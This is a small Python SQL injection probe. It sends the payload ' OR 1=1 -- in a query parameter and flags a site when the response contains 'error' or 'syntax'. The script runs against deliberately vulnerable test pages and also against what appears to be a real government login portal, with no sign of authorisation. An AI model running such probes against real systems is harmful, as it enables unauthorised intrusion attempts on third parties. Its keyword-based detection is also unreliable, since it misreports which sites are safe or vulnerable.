import requests
from requests.exceptions import ConnectTimeout

def check_sql_injection(url, param):
    payload = f"{url}?{param}=' OR 1=1 --"
    try:
        # Added a timeout of 5 seconds for the request
        response = requests.get(payload, timeout=5)
        if "error" in response.text or "syntax" in response.text:
            print(f"Potential SQL injection vulnerability at: {payload}")
        else:
            print(f"Seems safe: {url}")
    except ConnectTimeout:
        print(f"Connection to {url} timed out. Could not check for SQL injection.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while checking {url}: {e}")


check_sql_injection("https://portal.naanmudhalvan.tn.gov.in/login", "login")
check_sql_injection("http://example.com/search", "query")
check_sql_injection("http://testphp.vulnweb.com/login.php", "username")
check_sql_injection("http://testphp.vulnweb.com/search.php", "search")
